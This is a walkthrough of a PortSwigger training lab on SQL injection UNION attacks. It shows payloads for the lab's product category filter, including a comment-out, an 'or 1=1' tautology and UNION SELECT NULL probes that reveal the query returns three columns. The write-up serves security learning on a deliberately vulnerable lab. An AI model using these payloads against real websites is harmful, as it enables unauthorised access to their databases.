
# SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

---------------------------------------------

We see there are 2 values displayed in the table, the name and the price of the products:


<img width="1013" height="831" alt="1" src="https://github.com/user-attachments/assets/94cd6276-d12c-4ffb-a553-99176562c594" />


The following payload is accepted and we see the 4 items from Gifts category:

```
/filter?category=Tech+gifts'--
```


<img width="1510" height="839" alt="2" src="https://github.com/user-attachments/assets/5639b56b-d5aa-43b5-8d76-1330b29c6a0c" />



The same happens with this payload, to display all values:

```
/filter?category=Tech+gifts'+or+1=1--
```

We will update the payload to execute a UNION attack and find the query takes 3 parameters and not 2:

```
/filter?category=Tech+gifts'+union+select+NULL,NULL,NULL--
```


<img width="1521" height="816" alt="3" src="https://github.com/user-attachments/assets/ffabd0af-48ce-4300-b5e7-496590bfbca5" />


We can also add values instead of using NULL:

```
/filter?category=Tech+gifts'+union+all+select+Null,'b',Null--
```


<img width="1520" height="793" alt="4" src="https://github.com/user-attachments/assets/847fdb84-54f2-4327-a52e-658093c39eff" />
